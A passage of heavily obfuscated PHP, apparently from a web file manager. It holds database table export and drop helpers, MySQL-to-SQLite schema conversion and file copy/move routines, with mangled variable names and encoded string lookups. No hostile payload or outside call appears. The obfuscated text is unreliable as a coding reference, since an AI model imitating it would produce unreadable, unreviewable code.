$‹®¬úÕ¦; } } } fclose($¨ó¸ºÇü); if (!empty($°ï¼Íãœ)) { $ô¡ä–ÀÜ = $•ïƒÙá . implode($Û¤²¤·‚[50], $°ï¼Íãœ); if (!$»–Ôéû“->execute($ô¡ä–ÀÜ)) { return !1; } if ($Ä–®ºŠà) { $Ä–®ºŠà->update($Ãœº¥ş); } } return !0; } public function dropTable($ ÈÖ¼™ = null) { $Üõ˜Ãİ† = $this->model()->db(); $ÂëÄŒê¼ = $ ÈÖ¼™ ? array($ ÈÖ¼™) : $Üõ˜Ãİ†->getTables(); if (!$ÂëÄŒê¼) { return; } foreach ($ÂëÄŒê¼ as $ ÈÖ¼™) { if ($ ÈÖ¼™) { $ ÈÖ¼™ = strtolower($ ÈÖ¼™); } else { continue; } $Üõ˜Ãİ†->execute("\x64\162\x6f\160\40\x74\x61\x62\154\x65\40\x69\x66\40\145\170\151\x73\x74\x73\x20\x60{$ ÈÖ¼™}\x60"); } } private function sqlEncode($é•˜¸†ø) { $”Íå¿äÂ =& $_SERVER[ Ö‘ñÄ”]; $½İ†¦ÖÔ = array(); foreach ($é•˜¸†ø as $¥æ”™´‘) { if (is_array($¥æ”™´‘)) { $¥æ”™´‘ = json_encode_force($¥æ”™´‘); } $¥æ”™´‘ = addslashes($¥æ”™´‘); $¥æ”™´‘ = str_replace(array($”Íå¿äÂ[1084], $”Íå¿äÂ[231]), array($”Íå¿äÂ[1085], $”Íå¿äÂ[1086]), $¥æ”™´‘); $½İ†¦ÖÔ[] = str_replace($”Íå¿äÂ[58], $”Íå¿äÂ[1087], $¥æ”™´‘); } return $”Íå¿äÂ[58] . implode($”Íå¿äÂ[1088], $½İ†¦ÖÔ) . $”Íå¿äÂ[58]; } private function sqlDecode($Ôßò¢ÆĞ, $Ş’÷‚Õ, $ïƒ¹Âç = '') { $¾‘Ôƒƒ¼ =& $_SERVER[ Ö‘ñÄ”]; $Ôßò¢ÆĞ = str_replace(array($¾‘Ôƒƒ¼[1085], $¾‘Ôƒƒ¼[1086]), array($¾‘Ôƒƒ¼[1084], $¾‘Ôƒƒ¼[231]), $Ôßò¢ÆĞ); if ($Ş’÷‚Õ == $¾‘Ôƒƒ¼[13]) { return $ïƒ¹Âç != $¾‘Ôƒƒ¼[1089] ? stripslashes($Ôßò¢ÆĞ) : $Ôßò¢ÆĞ; } if ($ïƒ¹Âç == $¾‘Ôƒƒ¼[1089]) { $Ôßò¢ÆĞ = str_replace($¾‘Ôƒƒ¼[1090], $¾‘Ôƒƒ¼[118], stripslashes($Ôßò¢ÆĞ)); } return $Ôßò¢ÆĞ; } public function getSqlFile($ÕöûÕ¿² = '') { $íúÃ—´­ =& $_SERVER[ Ö‘ñÄ”]; $€¯»İÜÖ = $this->dbType(!0); $éĞ ©Å = CONTROLLER_DIR . "\x69\x6e\x73\x74\x61\x6c\154\57\144\141\x74\x61\57{$€¯»İÜÖ}\x2e\x73\161\x6c"; $¶Ê¼îåû = file_get_contents($éĞ ©Å); $“õàüòÔ = $íúÃ—´­[1091] . ($€¯»İÜÖ == $íúÃ—´­[817] ? $íúÃ—´­[1092] : $íúÃ—´­[1093]) . $íúÃ—´­[1094]; preg_match_all($“õàüòÔ, $¶Ê¼îåû, $–ÄÄ¬–); $³‡§š¼• = $–ÄÄ¬–[1]; $ºœáë®õ = $this->model()->db(); $»…û³óŒ = $ºœáë®õ->getTables(); $÷ËŸÉØ = TEMP_FILES . $íúÃ—´­[1095] . date($íúÃ—´­[764]) . $íúÃ—´­[8]; del_dir($÷ËŸÉØ); mk_dir($÷ËŸÉØ); $Âšá”÷© = $÷ËŸÉØ . $íúÃ—´­[1096]; $‰¿Èš¹ô = $÷ËŸÉØ . $íúÃ—´­[1097]; $÷¶ëÉ÷¿ = $€¯»İÜÖ == $íúÃ—´­[13] ? $íúÃ—´­[817] : $íúÃ—´­[13]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\164\141\x6c\x6c\57\x64\141\164\141\57{$÷¶ëÉ÷¿}\56\x73\161\x6c", $÷ËŸÉØ); @touch($÷ËŸÉØ . $€¯»İÜÖ . $íúÃ—´­[801]); $ş´íıê• = fopen($Âšá”÷©, $íúÃ—´­[1072]); $Ùµ Ò = fopen($‰¿Èš¹ô, $íúÃ—´­[1072]); if ($€¯»İÜÖ == $íúÃ—´­[13]) { $»…û³óŒ = array_diff($»…û³óŒ, array($íúÃ—´­[797], $íúÃ—´­[798])); $ë˜üŸÊ = array($íúÃ—´­[1098], $íúÃ—´­[1099], $íúÃ—´­[1100]); fwrite($Ùµ Ò, implode(PHP_EOL, $ë˜üŸÊ) . PHP_EOL . PHP_EOL); foreach ($»…û³óŒ as $ôİæŞÍ) { $À—à”ğÂ = $this->sqlFromSqlite($ôİæŞÍ); if (!$À—à”ğÂ[$íúÃ—´­[13]]) { continue; } fwrite($Ùµ Ò, $À—à”ğÂ[$íúÃ—´­[13]] . PHP_EOL . PHP_EOL); if (!in_array($ôİæŞÍ, $³‡§š¼•)) { fwrite($ş´íıê•, $À—à”ğÂ[$íúÃ—´­[817]] . PHP_EOL . PHP_EOL); } } } else { foreach ($»…û³óŒ as $ôİæŞÍ) { $À—à”ğÂ = $this->sqlFromMysql($ôİæŞÍ); if (!$À—à”ğÂ[$íúÃ—´­[817]]) { continue; } fwrite($ş´íıê•, $À—à”ğÂ[$íúÃ—´­[817]] . PHP_EOL . PHP_EOL); if (!in_array($ôİæŞÍ, $³‡§š¼•)) { fwrite($Ùµ Ò, $À—à”ğÂ[$íúÃ—´­[13]] . PHP_EOL . PHP_EOL); } } } fclose($ş´íıê•); fclose($Ùµ Ò); $¶Ê¼îåû = array($íúÃ—´­[817] => $Âšá”÷©, $íúÃ—´­[13] => $‰¿Èš¹ô); return $ÕöûÕ¿² ? $¶Ê¼îåû[$ÕöûÕ¿²] : $¶Ê¼îåû; } public function dbType($õ‚øôúÉ = false) { $ŞÚ«ÜœÒ =& $_SERVER[ Ö‘ñÄ”]; $³‡œÎú¶ = $õ‚øôúÉ ? $GLOBALS[$ŞÚ«ÜœÒ[6]][$ŞÚ«ÜœÒ[21]] : $this->database; $³‡œÎú¶ = array_change_key_case($³‡œÎú¶); $Ö•ÌôËå = $³‡œÎú¶[$ŞÚ«ÜœÒ[973]]; if ($Ö•ÌôËå == $ŞÚ«ÜœÒ[970]) { $¥É³ºšÅ = explode($ŞÚ«ÜœÒ[4], $³‡œÎú¶[$ŞÚ«ÜœÒ[979]]); $Ö•ÌôËå = $¥É³ºšÅ[0]; } $¸ÜÌˆıË = array($ŞÚ«ÜœÒ[1101] => $ŞÚ«ÜœÒ[13], $ŞÚ«ÜœÒ[918] => $ŞÚ«ÜœÒ[817]); if (isset($¸ÜÌˆıË[$Ö•ÌôËå])) { $Ö•ÌôËå = $¸ÜÌˆıË[$Ö•ÌôËå]; } return $Ö•ÌôËå; } public function sqlFromMysql($½œñ¥‹©, $–É‡¸Ô = '') { $ÊªÚæ–ü =& $_SERVER[ Ö‘ñÄ”]; $³Õ“¶Ğº = $this->model()->db(); $³™ìôÇÎ = $³Õ“¶Ğº->query($ÊªÚæ–ü[1102] . $½œñ¥‹© . $ÊªÚæ–ü[393]); if (!$³™ìôÇÎ || !$³™ìôÇÎ[0]) { return !1; } $İÙƒÕéœ = _get($³™ìôÇÎ[0], $ÊªÚæ–ü[1103], $ÊªÚæ–ü[12]); if (!$İÙƒÕéœ) { return !1; } $œÖ”±·Ç = "\104\122\x4f\x50\x20\x54\101\x42\x4c\105\x20\111\x46\40\105\x58\x49\x53\124\x53\x20\140{$½œñ¥‹©}\140\x3b" . PHP_EOL . $İÙƒÕéœ . $ÊªÚæ–ü[71]; if ($–É‡¸Ô && $–É‡¸Ô == $ÊªÚæ–ü[817]) { return $œÖ”±·Ç; } $üÉ¶îÔ³ = array_change_key_case($GLOBALS[$ÊªÚæ–ü[6]][$ÊªÚæ–ü[21]]); $şÜ«ì¿ = $üÉ¶îÔ³[$ÊªÚæ–ü[978]]; $§•§Û£ê = $ÊªÚæ–ü[1104] . $şÜ«ì¿ . $ÊªÚæ–ü[1105] . $½œñ¥‹© . $ÊªÚæ–ü[58]; $ôíú“Ç¡ = $ÊªÚæ–ü[1106] . $½œñ¥‹© . $ÊªÚæ–ü[906]; $µ†„ñã = $³Õ“¶Ğº->query($§•§Û£ê); if (empty($µ†„ñã)) { $ßªÖô·Å = array($ÊªÚæ–ü[817] => $ÊªÚæ–ü[12], $ÊªÚæ–ü[13] => $ÊªÚæ–ü[12]); return $–É‡¸Ô ? $ßªÖô·Å[$–É‡¸Ô] : $ßªÖô·Å; } $æ¼ ¾õì = $³Õ“¶Ğº->query($ôíú“Ç¡); $éÕú¹ú˜ = $ÊªÚæ–ü[12]; $™£Ÿˆá„ = array(); foreach ($æ¼ ¾õì as $†¤ì³‹›) { if (!$éÕú¹ú˜ && $†¤ì³‹›[$ÊªÚæ–ü[1107]] == $ÊªÚæ–ü[1108]) { $éÕú¹ú˜ = $†¤ì³‹›[$ÊªÚæ–ü[1109]]; } if (isset($™£Ÿˆá„[$†¤ì³‹›[$ÊªÚæ–ü[1107]]])) { $™£Ÿˆá„[$†¤ì³‹›[$ÊªÚæ–ü[1107]]][$ÊªÚæ–ü[1110]][] = $†¤ì³‹›[$ÊªÚæ–ü[1109]]; continue; } $™£Ÿˆá„[$†¤ì³‹›[$ÊªÚæ–ü[1107]]] = array($ÊªÚæ–ü[1111] => $†¤ì³‹›[$ÊªÚæ–ü[1107]], $ÊªÚæ–ü[1110] => array($†¤ì³‹›[$ÊªÚæ–ü[1109]]), $ÊªÚæ–ü[1112] => $†¤ì³‹›[$ÊªÚæ–ü[1113]] == $ÊªÚæ–ü[88] ? 0 : 1); } $ïÒ¢Çú = array(); foreach ($™£Ÿˆá„ as $†¤ì³‹›) { $ˆ¥Ğàã‘ = $†¤ì³‹›[$ÊªÚæ–ü[1111]] == $ÊªÚæ–ü[1108]; $ÖñÅÈö = array($ÊªÚæ–ü[1114], $†¤ì³‹›[$ÊªÚæ–ü[1112]] == $ÊªÚæ–ü[88] && !$ˆ¥Ğàã‘ ? $ÊªÚæ–ü[1115] : $ÊªÚæ–ü[12], $ÊªÚæ–ü[1116], $ÊªÚæ–ü[1117] . $½œñ¥‹© . $ÊªÚæ–ü[11] . ($ˆ¥Ğàã‘ ? $ÊªÚæ–ü[1118] : $†¤ì³‹›[$ÊªÚæ–ü[1111]]) . $ÊªÚæ–ü[118], $ÊªÚæ–ü[1119], $ÊªÚæ–ü[118] . $½œñ¥‹© . $ÊªÚæ–ü[118], $ÊªÚæ–ü[1120] . implode($ÊªÚæ–ü[1121], $†¤ì³‹›[$ÊªÚæ–ü[1110]]) . $ÊªÚæ–ü[1122]); $ïÒ¢Çú[] = implode($ÊªÚæ–ü[53], $ÖñÅÈö) . $ÊªÚæ–ü[71]; } $¤êñÏ»ë = array(); $¥¾õÍ€Ä = array($ÊªÚæ–ü[1123] => $ÊªÚæ–ü[1124], $ÊªÚæ–ü[1124] => $ÊªÚæ–ü[1124], $ÊªÚæ–ü[297] => $ÊªÚæ–ü[324], $ÊªÚæ–ü[296] => $ÊªÚæ–ü[324]); foreach ($µ†„ñã as $†¤ì³‹›) { $ÖñÅÈö = array($ÊªÚæ–ü[118] . $†¤ì³‹›[$ÊªÚæ–ü[1125]] . $ÊªÚæ–ü[118], isset($¥¾õÍ€Ä[$†¤ì³‹›[$ÊªÚæ–ü[1126]]]) ? $¥¾õÍ€Ä[$†¤ì³‹›[$ÊªÚæ–ü[1126]]] : $†¤ì³‹›[$ÊªÚæ–ü[1127]], $†¤ì³‹›[$ÊªÚæ–ü[1128]] == $ÊªÚæ–ü[904] ? $ÊªÚæ–ü[1129] : $ÊªÚæ–ü[1130], $†¤ì³‹›[$ÊªÚæ–ü[1125]] == $éÕú¹ú˜ ? $ÊªÚæ–ü[1131] : $ÊªÚæ–ü[12], $†¤ì³‹›[$ÊªÚæ–ü[955]] ? strtoupper(str_replace($ÊªÚæ–ü[11], $ÊªÚæ–ü[12], $†¤ì³‹›[$ÊªÚæ–ü[955]])) : $ÊªÚæ–ü[12]); $¤êñÏ»ë[] = trim(implode($ÊªÚæ–ü[53], $ÖñÅÈö)); } $°ğßß± = array($ÊªÚæ–ü[1132] . $½œñ¥‹© . $ÊªÚæ–ü[1133], $ÊªÚæ–ü[1134] . $½œñ¥‹© . $ÊªÚæ–ü[1135], implode($ÊªÚæ–ü[50] . PHP_EOL, $¤êñÏ»ë), $ÊªÚæ–ü[952]); $™Š¦ğÂù = implode(PHP_EOL, array_merge($°ğßß±, $ïÒ¢Çú)); if ($–É‡¸Ô && $–É‡¸Ô == $ÊªÚæ–ü[13]) { return $™Š¦ğÂù; } $ßªÖô·Å = array($ÊªÚæ–ü[817] => $œÖ”±·Ç, $ÊªÚæ–ü[13] => $™Š¦ğÂù); return $–É‡¸Ô ? $ßªÖô·Å[$–É‡¸Ô] : $ßªÖô·Å; } public function sqlFromSqlite($ìõìœ ó, $©—ºœ‹ = '') { $½º”è =& $_SERVER[ Ö‘ñÄ”]; $¦ĞÌšñ¸ = $this->model()->db(); $ıïıñİÆ = "\x50\x52\x41\x47\115\x41\40\x54\101\x42\114\x45\x5f\111\x4e\x46\x4f\40\50\47{$ìõìœ ó}\x27\51"; $¦èƒßµ = "\123\x45\x4c\105\103\124\40\52\40\x46\x52\x4f\115\40\163\x71\154\151\x74\145\x5f\x6d\141\x73\x74\145\x72\x20\127\x48\105\122\105\40\x74\142\154\x5f\x6e\x61\155\145\40\x3d\x20\x27{$ìõìœ ó}\47"; $¬Âøò¤ó = $¦ĞÌšñ¸->query($ıïıñİÆ); if (empty($¬Âøò¤ó)) { $şÁäŒË› = array($½º”è[817] => $½º”è[12], $½º”è[13] => $½º”è[12]); return $©—ºœ‹ ? $şÁäŒË›[$©—ºœ‹] : $şÁäŒË›; } $³ùóÖ = $¦ĞÌšñ¸->query($¦èƒßµ); $‹ÒÕ”êß = $€³ğú»¥ = array(); foreach ($³ùóÖ as $ö‚³·³€) { if ($ö‚³·³€[$½º”è[33]] == $½º”è[288]) { $‹ÒÕ”êß[] = $ö‚³·³€[$½º”è[1136]]; } else { $€³ğú»¥[$ö‚³·³€[$½º”è[32]]] = $ö‚³·³€[$½º”è[1136]]; } } $à’Ê†¯ = array_merge(array($½º”è[1132] . $ìõìœ ó . $½º”è[118]), $‹ÒÕ”êß, array_values($€³ğú»¥)); $à’Ê†¯ = implode($½º”è[71] . PHP_EOL, $à’Ê†¯) . $½º”è[71]; if ($©—ºœ‹ && $©—ºœ‹ == $½º”è[13]) { return $à’Ê†¯; } $¯Ú¨ÇıÖ = array(); $©…¸ûÌ¬ = array($½º”è[1124] => $½º”è[1137], $½º”è[324] => $½º”è[1138]); $©şû†Óİ = $½º”è[12]; foreach ($¬Âøò¤ó as $ö‚³·³€) { if ($ö‚³·³€[$½º”è[57]] == $½º”è[88]) { $©şû†Óİ = $ö‚³·³€[$½º”è[32]]; } $”¬“Ì¼¸ = array($½º”è[393] . $ö‚³·³€[$½º”è[32]] . $½º”è[393], isset($©…¸ûÌ¬[$ö‚³·³€[$½º”è[33]]]) ? $©…¸ûÌ¬[$ö‚³·³€[$½º”è[33]]] : $ö‚³·³€[$½º”è[33]], $ö‚³·³€[$½º”è[35]] == $½º”è[88] ? $½º”è[1129] : $½º”è[1139] . $ö‚³·³€[$½º”è[56]], $ö‚³·³€[$½º”è[57]] == $½º”è[88] ? $½º”è[1140] : $½º”è[12]); $¯Ú¨ÇıÖ[] = trim(implode($½º”è[53], $”¬“Ì¼¸)); } foreach ($€³ğú»¥ as $·Ïˆá™º => $ƒòÁëÀí) { $şÙ±ïÎ” = str_replace($½º”è[1141] . $ìõìœ ó . $½º”è[11], $½º”è[12], $·Ïˆá™º); $¢‚ù‘¬ë = str_replace(array($½º”è[118], $½º”è[963]), $½º”è[393], substr($ƒòÁëÀí, stripos($ƒòÁëÀí, $½º”è[269]))); if ($şÙ±ïÎ” == $½º”è[1118]) { $ğûóÍ¨‡ = $½º”è[1142] . $©şû†Óİ . $½º”è[1143]; } else { $ğûóÍ¨‡ = (stripos($şÙ±ïÎ”, $½º”è[11]) ? $½º”è[1144] : $½º”è[12]) . ($½º”è[1145] . $şÙ±ïÎ” . $½º”è[1146] . $¢‚ù‘¬ë); } $¯Ú¨ÇıÖ[] = $ğûóÍ¨‡; } $àÖÆ¿†¸ = array($½º”è[1147] . $ìõìœ ó . $½º”è[1148], $½º”è[1149] . $ìõìœ ó . $½º”è[1150], implode($½º”è[50] . PHP_EOL, $¯Ú¨ÇıÖ), $½º”è[1151]); $Ç½Å½Ø³ = implode(PHP_EOL, $àÖÆ¿†¸); if ($©—ºœ‹ && $©—ºœ‹ == $½º”è[817]) { return $Ç½Å½Ø³; } $şÁäŒË› = array($½º”è[817] => $Ç½Å½Ø³, $½º”è[13] => $à’Ê†¯); return $©—ºœ‹ ? $şÁäŒË›[$©—ºœ‹] : $şÁäŒË›; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($€”Œè¸, $æÈĞ÷ƒ) { $”ˆ›äĞå =& $_SERVER[ Ö‘ñÄ”]; $ Å›‰‰ã = $æÈĞ÷ƒ; $GLOBALS[$”ˆ›äĞå[1152]] = $”ˆ›äĞå[1153] . $€”Œè¸; Hook::trigger($”ˆ›äĞå[1153] . $€”Œè¸ . $”ˆ›äĞå[1154], $ Å›‰‰ã); $¹ùñ˜¦œ = self::driverMake($æÈĞ÷ƒ[0]); if (!$¹ùñ˜¦œ) { return !1; } if (method_exists($¹ùñ˜¦œ, $€”Œè¸)) { $ô¹Í¥Æ = @call_user_func_array(array($¹ùñ˜¦œ, $€”Œè¸), $æÈĞ÷ƒ); } else { if (method_exists($¹ùñ˜¦œ, $”ˆ›äĞå[1155])) { $ô¹Í¥Æ = @call_user_func_array(array($¹ùñ˜¦œ, $€”Œè¸), $æÈĞ÷ƒ); } else { if (method_exists(self, $€”Œè¸)) { $ô¹Í¥Æ = @call_user_func_array(array(self, $€”Œè¸), $æÈĞ÷ƒ); } else { $ô¹Í¥Æ = call_user_func_array(array(parent, $€”Œè¸), $æÈĞ÷ƒ); } } } Hook::trigger($”ˆ›äĞå[1153] . $€”Œè¸ . $”ˆ›äĞå[1156], $ Å›‰‰ã, $ô¹Í¥Æ); return $ô¹Í¥Æ; } public static function init($ãá±ê) { return self::driverMake($ãá±ê); } public static function copy($À®ÄŞ¾, $¾ºÓ¾úê, $§ªåŠí¶ = false, $ø³ÛÏœÈ = false) { return self::copyMoveStart($À®ÄŞ¾, $¾ºÓ¾úê, $§ªåŠí¶, $_SERVER[ Ö‘ñÄ”][563], $ø³ÛÏœÈ); } public static function move($ëà…Å‚³, $«Ô‡¥¤¼, $—³‰úàÓ = false, $¡Á‚İãß = false) { return self::copyMoveStart($ëà…Å‚³, $«Ô‡¥¤¼, $—³‰úàÓ, $_SERVER[ Ö‘ñÄ”][565], $¡Á‚İãß); } private static function copyMoveStart($È´Ô£ã, $‰èÔÍ’ƒ, $Ö¼˜ëî÷, $©¢ĞıÉ¢, $ÍØÍ) { $©“ÒÜé« =& $_SERVER[ Ö‘ñÄ”]; $ôÛÇÌ = array($È´Ô£ã, $‰èÔÍ’ƒ, $Ö¼˜ëî÷, $ÍØÍ); Hook::trigger($©“ÒÜé«[1153] . $©¢ĞıÉ¢ . $©“ÒÜé«[1154], $ôÛÇÌ); $²ø……Ğ = self::copyMove($È´Ô£ã, $‰èÔÍ’ƒ, $Ö¼˜ëî÷, $©¢ĞıÉ¢, $ÍØÍ); Hook::trigger($©“ÒÜé«[1153] . $©¢ĞıÉ¢ . $©“ÒÜé«[1156], $ôÛÇÌ, $²ø……Ğ); return $²ø……Ğ; } public static function saveFile($ÀÛ¹ï«², $õ˜µÖ›, $Áæ½úö = true) { $´úÀ‹˜Š =& $_SERVER[ Ö‘ñÄ”]; $ÃÍä€²Í = self::info($õ˜µÖ›); $À¿„ø = self::driverMake($ÀÛ¹ï«²); $Ú«¹¹Ù¼ = self::driverMake($õ˜µÖ›); $¡¢¿İä½ = !1; if ($Ú«¹¹Ù¼->pathParse[$´úÀ‹˜Š[1157]]) { $¡¢¿İä½ = $Ú«¹¹Ù¼; $Ó‰‡–ßÍ = $Ú«¹¹Ù¼->pathParse[$´úÀ‹˜Š[1157]]; $Ú«¹¹Ù¼ = self::driverMake($Ó‰‡–ßÍ); } if ($À¿„ø->pathParse[$´úÀ‹˜Š[1157]]) { $ÍäÚãÔğ = $À¿„ø->pathParse[$´úÀ‹˜Š[1157]]; $À¿„ø = self::driverMake($ÍäÚãÔğ); } $Ñ±–ä¬ = $Ú«¹¹Ù¼->pathFather($õ˜µÖ›); $»Ğ€Ï´ = !0; if (!$Áæ½úö && self::driverIsSame($À¿„ø, $Ú«¹¹Ù¼)) { $»Ğ€Ï´ = !1; } $Îèìş¾Š = self::copyFile($À¿„ø, $ÀÛ¹ï«², $Ú«¹¹Ù¼, $Ñ±–ä¬, $ÃÍä€²Í[$´úÀ‹˜Š[32]], $»Ğ€Ï´); if ($¡¢¿İä½) { $Îèìş¾Š = $¡¢¿İä½->getPathOuter($Îèìş¾Š); } return $Îèìş¾Š; } private static function copyMove($ú«ï£õó, $“Œ¬•áİ, $Ÿ ÛÃÈÑ, $ïèé¨Õ€, $çıï¼° = false) { $­¿Î¨é§ =& $_SERVER[ Ö‘ñÄ”]; if (!$ú«ï£õó || $ú«ï£õó == $­¿Î¨é§[8] || !$“Œ¬•áİ) { return !1; } ignore_timeout(); $¬Ñ„Ã†ô = self::driverMake($ú«ï£õó); $å‡õè¤Œ = self::driverMake($“Œ¬•áİ); $€¬®‰ˆ÷ = $ïèé¨Õ€ == $­¿Î¨é§[565]; $Ş«–™× = !1; if ($å‡õè¤Œ->pathParse[$­¿Î¨é§[1157]]) { $Ş«–™× = $å‡õè¤Œ; $“Œ¬•áİ = $å‡õè¤Œ->pathParse[$­¿Î¨é§[1157]]; $å‡õè¤Œ = self::driverMake($“Œ¬•áİ); } if ($¬Ñ„Ã†ô->pathParse[$­¿Î¨é§[1157]]) { $ú«ï£õó = $¬Ñ„Ã†ô->pathParse[$­¿Î¨é§[1157]]; $¬Ñ„Ã†ô = self::driverMake($ú«ï£õó); } self::check($¬Ñ„Ã†ô, $ú«ï£õó, $å‡õè¤Œ, $“Œ¬•áİ); Hook::trigger($­¿Î¨é§[1158], $¬Ñ„Ã†ô, $ú«ï£õó, $å‡õè¤Œ, $“Œ¬•áİ); $„Ê¹ÛÍ§ = self::driverIsSame($¬Ñ„Ã†ô, $å‡õè¤Œ); if ($„Ê¹ÛÍ§) { if ($ïèé¨Õ€ == $­¿Î¨é§[565] && !method_exists($å‡õè¤Œ, $­¿Î¨é§[1159]) && trim($“Œ¬•áİ, $­¿Î¨é§[8]) == trim($å‡õè¤Œ->pathFather($ú«ï£õó), $­¿Î¨é§[8])) { if ($¬Ñ„Ã†ô->pathThis($ú«ï£õó) != $çıï¼° && !$¬Ñ„Ã†ô->isTypeObject()) { return $¬Ñ„Ã†ô->rename($ú«ï£õó, $çıï¼°); } return $å‡õè¤Œ->getPathOuter($ú«ï£õó); } if (method_exists($å‡õè¤Œ, $ïèé¨Õ€)) { return $å‡õè¤Œ->{$ïèé¨Õ€}($ú«ï£õó, $“Œ¬•áİ, $Ÿ ÛÃÈÑ, $çıï¼°); } } if ($„Ê¹ÛÍ§ && $ïèé¨Õ€ == $­¿Î¨é§[565] && $å‡õè¤Œ->getType() == $­¿Î¨é§[106]) { $ÉßÉ†İ  = $å‡õè¤Œ->movePath($ú«ï£õó, $“Œ¬•áİ, $çıï¼°); if ($ÉßÉ†İ ) { return $ÉßÉ†İ ; } } $ëİĞã×° = $¬Ñ„Ã†ô->isFile($ú«ï£õó); if (!$ëİĞã×° && $å‡õè¤Œ->getType() == $­¿Î¨é§[771] && $¬Ñ„Ã†ô->getType() == $­¿Î¨é§[106]) { $ÉßÉ†İ  = $å‡õè¤Œ->copyFolderFromIO($¬Ñ„Ã†ô, $ú«ï£õó, $“Œ¬•áİ, $Ÿ ÛÃÈÑ, $€¬®‰ˆ÷, $çıï¼°); } else { $ÉßÉ†İ  = self::copyPath($¬Ñ„Ã†ô, $ú«ï£õó, $å‡õè¤Œ, $“Œ¬•áİ, $Ÿ ÛÃÈÑ, $€¬®‰ˆ÷, $ëİĞã×°, $çıï¼°); } if ($ÉßÉ†İ  && $€¬®‰ˆ÷) { $¬Ñ„Ã†ô->remove($ú«ï£õó); } if ($Ş«–™×) { $ÉßÉ†İ  = $Ş«–™×->getPathOuter($ÉßÉ†İ ); } return $ÉßÉ†İ ; } private static function check($“®ôœ‡¶, $ÀŞáÕë«, $Æ†ı×ñ‰, &$îøáòëï) { $Ù—¾£Ó‰ =& $_SERVER[ Ö‘ñÄ”]; if (self::driverIsSame($“®ôœ‡¶, $Æ†ı×ñ‰) && $“®ôœ‡¶->isFolder($ÀŞáÕë«) && $“®ôœ‡¶->isParentOf($ÀŞáÕë«, $îøáòëï)) { show_json(LNG($Ù—¾£Ó‰[1160]), !1); } if (!$“®ôœ‡¶->exist($ÀŞáÕë«)) { show_json(LNG($Ù—¾£Ó‰[105]), !1); } } private static function copyPath($ ¼ùù²È, $µÇÆ”‡£, $ç‚Ø¶É¬, $¹…º™âà, $å˜ìÓ•, $Û³Ë™§¹, $¹€šü„Ï, $ı’å‰² = false, $ºŠàÃüï = true) { $Ìˆ’³ƒ« =& $_SERVER[ Ö‘ñÄ”]; $‚È­€Ä = empty($ı’å‰²) && $ı’å‰² !== $Ìˆ’³ƒ«[197] ? $ ¼ùù²È->pathThis($µÇÆ”‡£) : $ı’å‰²; if ($å˜ìÓ•) { $ÁÁ”Ïä’ = $ç‚Ø¶É¬->fileNameExist($¹…º™âà, $‚È­€Ä); $­Æê„² = $‚È­€Ä; $‚È­€Ä = $ç‚Ø¶É¬->fileNameAuto($¹…º™âà, $‚È­€Ä, $å˜ìÓ•, !$¹€šü„Ï); if (!$ÁÁ”Ïä’ || $­Æê„² != $‚È­€Ä) { $å˜ìÓ• = !1; } if ($ºŠàÃüï && !$å˜ìÓ•) { $ç‚Ø¶É¬->_data[$Ìˆ’³ƒ«[1161]] = !0; } } if ($¹€šü„Ï) { return self::copyFile($ ¼ùù²È, $µÇÆ”‡£, $ç‚Ø¶É¬, $¹…º™âà, $‚È­€Ä, $Û³Ë™§¹); } if ($å˜ìÓ• == REPEAT_RENAME_FOLDER) { $å˜ìÓ• = !1; } $ÔÑ‰İÇ = rtrim($¹…º™âà, $Ìˆ’³ƒ«[8]) . $Ìˆ’³ƒ«[8] . $‚È­€Ä; $Å¥ì·Îö = $ç‚Ø¶É¬->mkdir($ç‚Ø¶É¬->getPath($ÔÑ‰İÇ), $å˜ìÓ•); $¹…º™âà = $ç‚Ø¶É¬->getPathInner($Å¥ì·Îö); $½ËïóÇğ = $ ¼ùù²È->listPath($µÇÆ”‡£, !0); $½ËïóÇğ = is_array($½ËïóÇğ) ? $½ËïóÇğ : array($Ìˆ’³ƒ«[83] => array(), $Ìˆ’³ƒ«[82] => array()); $ğÛ¼üŸº = array_merge($½ËïóÇğ[$Ìˆ’³ƒ«[83]], $½ËïóÇğ[$Ìˆ’³ƒ«[82]]); foreach ($ğÛ¼üŸº as $Ã­ë‚Ñ×) { $æ¨–îß· = $Ã­ë‚Ñ×[$Ìˆ’³ƒ«[33]] == $Ìˆ’³ƒ«[199]; $µÇÆ”‡£ = $ ¼ùù²È->getPathInner($Ã­ë‚Ñ×[$Ìˆ’³ƒ«[84]]); $ÈƒÇ§Œ½ = self::copyPath($ ¼ùù²È, $µÇÆ”‡£, $ç‚Ø¶É¬, $¹…º™âà, $å˜ìÓ•, $Û³Ë™§¹, $æ¨–îß·, !1, !1); if (!$ÈƒÇ§Œ½) { IO::errorTips($Ìˆ’³ƒ«[1162] . $µÇÆ”‡£ . $Ìˆ’³ƒ«[70] . $¹…º™âà); } } self::copyMoveKeepInfo($ ¼ùù²È, $µÇÆ”‡£, $Å¥ì·Îö); return $Å¥ì·Îö; } private static function copyFile($†‰¡Ü·š, $”Ùâº“¨, $Ş²Î™¦, $›¥ò©é˜, $€¦—Ä, $Úã¶ü÷Ä) { $›Áì½†® =& $_SERVER[ Ö‘ñÄ”]; $›¥ò©é˜ = $Ş²Î™¦->getPath(rtrim($›¥ò©é˜, $›Áì½†®[8]) . $›Áì½†®[8] . $€¦—Ä); $ †ÒÍ– = $›Áì½†®[1163] . time() . rand_string(5); Hook::trigger($›Áì½†®[1164], $†‰¡Ü·š, $”Ùâº“¨, $Ş²Î™¦, $›¥ò©é˜, $€¦—Ä, $ †ÒÍ–); if (self::driverIsSame($†‰¡Ü·š, $Ş²Î™¦)) { if ($Úã¶ü÷Ä) { $ç°–ßîµ = $Ş²Î™¦->moveFile($”Ùâº“¨, $›¥ò©é˜); } else { $ç°–ßîµ = $Ş²Î™¦->copyFile($”Ùâº“¨, $›¥ò©é˜); } Hook::trigger($›Áì½†®[1165], $†‰¡Ü·š, $”Ùâº“¨, $Ş²Î™¦, $›¥ò©é˜, $€¦—Ä, $ç°–ßîµ); self::copyMoveKeepInfo($†‰¡Ü·š, $”Ùâº“¨, $ç°–ßîµ); return $ç°–ßîµ; } $íˆ¢…ù¶ = TEMP_FILES; if ($GLOBALS[$›Áì½†®[6]][$›Áì½†®[89]][$›Áì½†®[809]]) { $íˆ¢…ù¶ = $GLOBALS[$›Áì½†®[6]][$›Áì½†®[89]][$›Áì½†®[809]]; } $ŸâÇ¯— = $íˆ¢…ù¶; mk_dir($ŸâÇ¯—); $ß‡˜äÅ = $ŸâÇ¯— . $ 